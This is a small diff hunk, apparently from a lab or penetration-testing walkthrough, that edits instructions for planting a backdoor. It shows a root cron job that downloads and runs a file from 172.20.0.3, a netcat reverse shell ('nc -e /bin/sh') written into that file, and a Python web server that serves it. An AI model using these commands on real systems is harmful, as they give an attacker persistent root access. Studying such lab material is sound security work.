@@ -132,7 +132,7 @@ echo '* * * * * root cd /tmp; wget 172.20.0.3/backdoor && chmod +x backdoor && .
 From another kali terminal:
 ```bash
 # write a backdoor script
-nc -e /bin/sh 172.20.0.3 4499
+echo 'nc -e /bin/sh 172.20.0.3 4499' > backdoor
 
 # serve script using http server
 python3 -m http.server 80
